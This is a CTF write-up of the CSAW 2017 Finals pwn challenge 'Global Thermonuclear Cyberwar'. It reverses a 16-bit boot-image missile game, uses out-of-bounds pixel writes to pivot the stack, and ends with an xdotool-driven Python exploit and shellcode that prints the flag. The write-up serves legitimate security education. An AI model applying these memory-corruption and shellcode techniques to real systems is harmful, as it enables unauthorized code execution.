[writeup by @abiondo]

**CTF:** CSAW CTF Final Round 2017

**Team:** spritzers (from [SPRITZ Research Group](http://spritz.math.unipd.it/))

**Task:** pwn / Global Thermonuclear Cyberwar

**Points:** 350

```
In this strange game, the only winning move is pwn.
[IP and credentials for VNC server]
```

This is the second part of [DEFCON 1](../../rev/defcon-50). Read that one first. The same system image is used here. We want to dump the flag at 0x1664 on the remote server.

When we enter the right password that we found while decrypting the ROM, we are presented with a game. First, we choose whether we want to be USA or USSR. Then the game displays a world map with four bases for each party. During each turn, we select one out of the four bases, then freely choose a point on the map and hit enter to launch a missile there. It animates two trails for our missile and for the other party's response missile, and two explosions once they hit.

Okay, let's load this baby up into IDA (base and entry point at 0x1000, 16-bit code). I will not go too deeply into the reversing details as it's not terribly interesting. All the names that follow where given by me.

The entry point immediately jumps to a `main` function at 0x3C67. This is an infinite loop (with a 255us delay) which reads the keyboard input, clears the framebuffer and renders the game. This last operation is handled by `render` at 0x380E, which calls either the USA/USSR selection rendering or the actual game rendering (`render_game` at 0x32D7).

Video memory is located at 0xA0000 and it's 320x200, row-major, 8bpp. Each pixel is a byte which identifies a color in a 256-color palette. The byte for the pixel at `(x, y)` is at offset `x + 320*y`, with `(0,0)` being the top-left corner of the screen. The game keeps a framebuffer with the same exact format at 0x10000. Drawing happens pixel-for-pixel on the framebuffer via the `draw_pixel(short x, short y, char color)` function at 0x3825. After the framebuffer is ready, the function at 0x3884 copies it to video memory.

When choosing the missile target, we use the arrow keys to control an small scope that looks like this:

```
 x
x x
 x
```

Where `x` marks a colored pixel. One of the first things I discovered is that you can freely change the color with the `Q` (increment) and `A` (decrement) keys.

At this point I also noticed the first vulnerability. The arrow keys control the *center* of the scope. The coordinates of the center are checked to ensure they stay within bounds. This, however, doesn't ensure that the *whole* cross is inside the screen! If we have the scope at `(x, 0)`, the top colored pixel will be at `(x, -1)`, which writes before the framebuffer. Similarly, the bottom pixel of a cross placed at the bottom of the screen will be written after the framebuffer. Since we can set whatever color we want, we control a full row (i.e., 320 bytes) before and after the framebuffer. Those values are not zeroed when clearing the framebuffer, as they lay outside of it.

Unfortunately, this is not enough by itself. There's nothing interesting after the framebuffer. The stack is placed before the buffer (grows backwards from 0xF000), but we can't reach it. However, we now have a simple way to place arbitrary data at known places in memory, which will probably come in handy during exploitation.

Another thing I noticed is that missile trails can go outside the framebuffer, too. For example, if the target is high enough the top part of the curve will be drawn at negative ordinates. Since those trails can be quite high, maybe we can use them to write to interesting places in memory. Code ends at 0x3C7C, so reaching it would require a trail that underflows by 156 or so rows. That might be hard. However, the stack is much closer and only requires 13 or so rows, which should be doable. Moreover, the trail's color is the same as the scope's color, so we control the written values.

I started playing with the trails to see if I could trigger a crash, and indeed I could. I was really just messing with it by hand, which was not very reproductible, so I thought of a better testing pattern. For each base, I would line up the scope with it, then go up to the top of the screen, then launch the missile. In the end this means that the scope would have the abscissa of the base and a zero ordinate. This was motivated because closer abscissae between base and target, and higher targets, resulted in higher trails, so I was maximizing the trail's height and damage to the stack.

I found that this pattern only triggered a crash on the leftmost USA base. I'm sure there are other positions that can trigger crashes, but as we'll see I was pretty lucky with what I found. I started investigating: the crash seemed to hijack control flow to some random address, then it would slide until it reached a instruction that performed an invalid memory access. It wasn't clear where the hijack happened. I wasted a lot of time reversing the code that calculated the trail, which in the end I didn't need. After a while I adopted a faster approach: I wrote a [small GDB Python script](./scripts/trace.py) that traced all the pixels written inside the stack by the trail. To do this, I breakpointed the call to `draw_pixel` inside the function that drew the two trails and collected the coordinates that resulted in writes before 0xF000. For some reason I couldn't get conditional breakpoints to work in GDB Python, so I did the filtering inside my breakpoint handler. This method is slow, and I'm sure there are better ways, but it was quick to write and worked well enough for the crashing target. It's late night in a CTF, ain't nobody got time for good code.

To run the script you need to launch QEMU with the `-s` option, so that it spawns a gdbserver on port 1234. Then run the script, launch your missile and once the slow-motion trail reaches the top of the screen the negative coordinates will start rolling out on your console:

```
$ ./trace.py
[...]
57 -13 0xeff9
57 -14 0xeeb9
57 -15 0xed79
57 -16 0xec39
57 -17 0xeaf9
57 -18 0xe9b9
```

Now I wanted to analyze those addresses and see what it was overwriting to crash the game. I set a conditional breakpoint on the same call to `draw_pixel` and looked at the addresses from that clean state: since the stack trace to that call was always the same, I had the correct picture of the stack.

The stack pointer at that breakpoint was 0xEF8A, so the only written address within the active stack was 0xEFF9. Looking around it yields a promising result:

```
(gdb) x/2hx 0xeff8
0xeff8: 0xeffc  0x381e
```

That 0x381E looks like a code address. Maybe it's a return address? Indeed, it's inside `render`, right after the call to the game rendering function. If this is the case, we're overwriting the MSB of the saved base pointer for `render` inside the `render_game` stack frame, which would be great news.

Okay, let's see if we're right. I set a conditional breakpoint on drawing `(57, -13)`. From there, I breaked at 0x381E and checked out the base pointer.

```
(gdb) b *0x3956 if *((short*)($sp+0))==57 && *((short*)($sp+2))==-13
Breakpoint 1 at 0x3956
(gdb) c
Continuing.
Breakpoint 1, 0x00003956 in ?? ()
(gdb) b *0x381e
Breakpoint 2 at 0x381e
(gdb) c
Continuing.
Breakpoint 2, 0x0000381e in ?? ()
(gdb) p/x $bp
$1 = 0xcfc
```

Look at that! The default color of the scope (red) is 0x0C. Indeed, the base pointer's MSB has been corrupted to that exact value. Remember we fully control the color, so we have full control over that base pointer's MSB. I was very lucky here. I don't know if this was intended, but if I hadn't found something like this I'd have had to fully reverse the trail calculations. 

```
(gdb) set architecture i8086
(gdb) x/4i $eip
=> 0x381e:  add    $0x0,%sp
   0x3821:  mov    %bp,%sp
   0x3823:  pop    %bp
   0x3824:  ret
```

We have a standard epilogue, which moves `bp` into `sp` and pops `bp`. Since there's a 2 byte pop, the stack pointer at `ret` (i.e., the location of the return address) will have a LSB of 0xFE.

A plan starts to form: we could use the scope's top pixel to write a fake return address to an address with 0xFE LSB, then use the trail corruption to set the saved BP's MSB properly, so that when `render` moves `bp` into `sp` it pivots onto our fake stack and then returns to the address we choose.

When choosing the addresses for our payload we have to keep in mind that the upper-left side above the framebuffer could be corrupted by the trail. So we have to go with either the right side of the row above the framebuffer, or with the row below the framebuffer. However, the address must be below 0x10000 (because the original BP is 0xEFFC and we only control the MSB). So right side of the row above the framebuffer it is. I chose to write the fake retaddr at 0xFFFE (extreme right of that row), which means the trail color hasa to be 0xFF. To write a byte at `0xfec0 + x` we simply set the color to the value we want and position the scope at `(x, 0)`, so that the top pixel at `(x, -1)` will do the job. Then we move it back down to `(x, 1)` so that we can move horizontally for the next write without corrupting the byte we just wrote.

Let's start with the "library" part (QEMU seems to ignore synthetic events, so we have to activate the window to go through XTEST):

```python
import time
import subprocess
import struct

WINDOW_TITLE = '^QEMU(.*VNC)?$'
WINDOW_ID = subprocess.check_output(['xdotool', 'search', '--limit', '1', '--name', WINDOW_TITLE]).strip()

# may need higher values for remote
DELAY_MAP_DRAW_S = 6
DELAY_KEYPRESS_MS = 12

scope_x = 160
scope_y = 100
scope_color = 0x0c

def activate_window():
    subprocess.check_call(['xdotool', 'windowactivate', WINDOW_ID])

def press(keys):
    subprocess.check_call(['xdotool', 'key', '--delay', str(DELAY_KEYPRESS_MS)] + list(keys))
    time.sleep(DELAY_KEYPRESS_MS / 1000.0)

def auth():
    press(['minus', 'J', 'O', 'S', 'H', 'U', 'A', 'minus'])

def select_blessed_base():
    press(['Return'])
    time.sleep(DELAY_MAP_DRAW_S)
    press(['Left', 'Left', 'Return'])

def move_scope_x(x):
    global scope_x
    if x < scope_x:
        press(['Left'] * (scope_x - x))
    elif x > scope_x:
        press(['Right'] * (x - scope_x))
    scope_x = x

def move_scope_y(y):
    global scope_y
    if y < scope_y:
        press(['Up'] * (scope_y - y))
    elif y > scope_y:
        press(['Down'] * (y - scope_y))
    scope_y = y

def set_scope_color(color):
    global scope_color
    if color < scope_color:
        press(['a'] * (scope_color - color))
    elif color > scope_color:
        press(['q'] * (color - scope_color))
    scope_color = color

def write_byte(addr, val):
    assert(0xfec0 <= addr <= 0xffff)
    set_scope_color(val)
    move_scope_x(addr - 0xfec0)
    move_scope_y(0)
    move_scope_y(1)

def trigger_trail(retaddr_addr):
    assert(0 <= retaddr_addr <= 0xffff and retaddr_addr & 0xff == 0xfe)
    set_scope_color(retaddr_addr >> 8)
    move_scope_x(60)
    move_scope_y(0)
    press(['Return'])

activate_window()
auth()
select_blessed_base()
```

Now we can write our payload. I decided to inject a small infinite loop shellcode before the fake return address, at 0xFFFC. Before running the script you need to start QEMU and wait until the login prompt. Don't mess with the focus.

```python
RETADDR_ADDR = 0xfffe
SHELLCODE = '\xeb\xfe'
PAYLOAD_ADDR = RETADDR_ADDR - len(SHELLCODE)
PAYLOAD = SHELLCODE + struct.pack('<H', PAYLOAD_ADDR)

for i in range(len(PAYLOAD)):
    write_byte(PAYLOAD_ADDR + i, ord(PAYLOAD[i]))

trigger_trail(RETADDR_ADDR)
```

I had GDB open in another shell, and Ctrl+C'ed once the game hanged:

```
Program received signal SIGINT, Interrupt.
0x0000fffc in ?? ()
```

Aww yeah! Now we just need to write a shellcode that prints the flag. We have to set the video mode to text and then output the string. However, there's code that already does something very similar: the MBR entry point (0x7C00) sets up text mode and prints the login prompt. If we patch that code and jump to it we can make our shellcode much shorter and simpler. The only catch is that it prints a zero-terminated string and the flag isn't zero-terminated, but this will just result in some garbage being printed after it. No big deal.

The address of the string to print is loaded with a `mov si, 0x7cb9` (`be b9 7c`) instruction at 0x7C13. We just need to patch it to `mov si, 0x1664` (`be 64 16`) and jump to 0x7C00:

```assembly_x86
bits 16

mov word [0x7c14], 0x1664
jmp 0x7c00
```

Assemble with `nasm -fbin shellcode.asm` and replace it in the previous script to get the [final exploit](./scripts/exploit.py):

```
SHELLCODE = '\xc7\x06\x14\x7c\x64\x16\xe9\xf7\x7b'
```

And it prints out `flag{__PWN_ON_SERVER_TO_GET_REAL_FLAG__}`. Run it against the provided VNC server, and voilà! We have the real flag: `flag{c4n_4ny0n3_really_w1n_1n_cyb3rw4r?}`.

For the sake of full disclosure, I didn't automate the keyboard input during the CTF. You might think I'm crazy, but consider that the missile target was easily selectable by hand. I injected the shellcode via `gdb`, because I knew I could do it by hand at the end. Same for the 0xFF trail color, I just set the global variable for it without messing with Q/A. So I was able to test the shellcode quickly, then wrote down a somewhat optimized key sequence, and only had to test it once locally. Then typed it again in the remote. The sequence took about one minute to type, which is far quicker than writing the automation. Sometimes, dumb is better (also I got the flag at 7AM after being up all night, I wasn't in the mood to mess with fake input).